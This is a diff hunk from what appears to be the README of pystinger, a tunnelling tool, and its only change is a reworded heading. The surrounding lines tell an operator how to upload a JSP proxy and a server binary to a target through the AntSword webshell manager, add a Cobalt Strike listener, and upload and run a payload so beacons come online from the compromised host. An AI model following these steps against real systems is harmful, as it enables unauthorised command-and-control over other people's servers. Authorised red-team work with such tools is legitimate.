@@ -86,7 +86,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 * Add listener on cobaltstrike,Listener port is ```60020``` (Handler/LISTEN port in ```RAT CONFIG``` of output ),listener address is ```127.0.0.1```
 * Generate payload,upload to the target and run.
 
-## cobaltstrike`s beacon online for multiple targets
+## cobaltstrike`s beacon online for multi targets
 
 * ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
 * ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe  192.168.3.11```to start pystinger-server (192.168.3.11 is intranet ipaddress of the target)
